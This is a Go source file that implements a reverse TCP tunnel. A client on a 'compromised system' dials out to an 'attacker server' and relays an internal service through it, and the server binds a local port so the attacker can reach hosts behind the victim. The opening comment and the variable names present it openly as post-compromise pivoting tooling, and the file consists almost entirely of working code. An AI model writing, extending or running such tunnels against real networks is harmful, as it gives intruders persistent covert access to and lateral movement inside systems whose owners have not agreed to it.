package pkg

// So it basically. The client connects to the server. Let's say my service listens on port 8080 and forwards traffic on my localhost port 7070 to where very that target server is so any request on port 7070 will be forwarded to the target server. On the target server am going to have my client so my client will receive that message and forward it to the local machine on the compromised system the compromised system will respond to my client so i take that response and forward it to my server am i correct

import (
	"io"
	"log"
	"log/slog"
	"net"
)

type Tunnling struct {
	// Localport which port gonna be listen for connections from clients
	localPort string
	bindPort  string
}

func BiForwarding(src, dst net.Conn) {
	go io.Copy(src, dst) // dst → src (responses)
	io.Copy(dst, src)    // src → dst (requests)
}

// This work for client
func ClientInternal(service string, targetAddr string) {
	attacker, err := net.Dial("tcp", targetAddr)
	if err != nil {
		log.Println("Failed to connect to attacker server:", err)
		return
	}
	defer attacker.Close()

	internalService, err := net.Dial("tcp", service)
	if err != nil {
		log.Println("Failed to connect to internal service:", err)
		return
	}
	defer internalService.Close()

	BiForwarding(attacker, internalService)
}

func bindLocal(localBind string, client net.Conn) {
	bind, err := net.Listen("tcp", localBind)
	if err != nil {
		log.Fatalf("error %s", err)
	}
	defer bind.Close()

	for {
		conn, err := bind.Accept()
		if err != nil {
			log.Println("error accepting local bind:", err)
			continue
		}
		go BiForwarding(client, conn)
	}
}
func InitTunnling() *Tunnling {
	return &Tunnling{}
}

func (tun *Tunnling) SetBindPort(bindPort string) *Tunnling {
	tun.bindPort = bindPort
	return tun
}

func (tun *Tunnling) SetLocalPort(localPort string) *Tunnling {
	tun.localPort = localPort
	return tun
}

func (tun *Tunnling) RunTun() {

	listener, err := net.Listen("tcp", tun.localPort)
	if err != nil {
		slog.Error("Failed to start server", "error", err)
		return
	}
	defer listener.Close()

	slog.Info("Server started", "addr", listener.Addr().String())

	for {
		client, err := listener.Accept()
		if err != nil {
			slog.Error("Failed to accept client", "error", err)
			continue
		}
		slog.Info("New client connected", "addr", client.RemoteAddr())

		// Forward traffic to localhost:4444
		go bindLocal(tun.bindPort, client)
	}
}
